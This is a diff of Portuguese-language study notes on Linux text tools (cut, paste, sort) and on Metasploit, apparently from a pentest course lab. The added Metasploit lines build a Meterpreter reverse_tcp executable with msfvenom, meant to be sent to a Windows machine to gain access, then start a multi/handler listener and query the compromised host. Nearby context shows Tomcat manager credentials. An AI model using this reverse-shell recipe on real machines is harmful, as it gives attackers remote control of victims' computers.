@@ -30,6 +30,25 @@ Comando uteis
   canal 2 (>)-> canal saida de erro
   | -> redirenciona pra outro comandos
 
+Uteis CUT
+  começa na posição 1
+  cut -c 1,4 -> cortar a coluna 1 e 4 de um arquivo
+  cut -c 1-4 -> cortar a coluna 1 ate a 4 de um arquivo
+  cut -c 1-4,10-15 -output-delimiter="," -> separa as colunas com ','
+  cut -f -d: 1,5 -> cortar 1 primeiro e o 5 campo separado pelo ':'
+
+Uteis PASTE
+  paste -> junta um arquivo no outro
+  paste -d: -> junta um arquivo com outro e separa com ':'
+  paste -s -> junta um arquivo com outro na horizontal
+
+Uteis SORT
+  sort -> ordena a entrada
+  sort -k 3 -t: -> ordena apartir do terceira coluna com o separador ':'
+  sort -r -> inverte a ordem
+  sort -u -> remove os iguais
+  sort -o -> escrever o resultado em outro arquivo
+
 Visualizar arquviso 
   wc arquivo.txt -> Mostra numero de bits, numero de linhas, numero de palavra
   wc -L -> Maximo de caracteres em uma linha
@@ -172,7 +191,7 @@ OWASP
   <role rolename="manager"/>
   <user username="tomcat" password="s3cret" roles="manager"/>
 
-Metasploit
+Metasploit - Armitage
   vim /usr/share/metasploit-framework/data/wordlists/root_userpass.txt -> wordlist
   msfdb init -> inicar o Metasploit
   msfconsole -> abrir o Metasploit
@@ -211,6 +230,17 @@ Metasploit
     depois de ter pego o acesso entrar na sessão
     sessions -i numero_id_Sessao
     init 0 -> desliga a maquina
+  Ivandindo windows
+    msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows -f exe LHOST=192.168.100.71 LPORT=4444 -o /root/teste.exe -> Enviar arquivo para windows para obter acesso
+    use multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set LHOST 192.168.100.71
+    set LPORT 4444
+    run
+    getuid -> pegar o nome do usuario
+    sysinfo -> informações do sistema
+    
+
 
 Baixar paginas e projetos web
   wget http://localhost:8080/bodgeit/ -> baixa uma pagina web em html
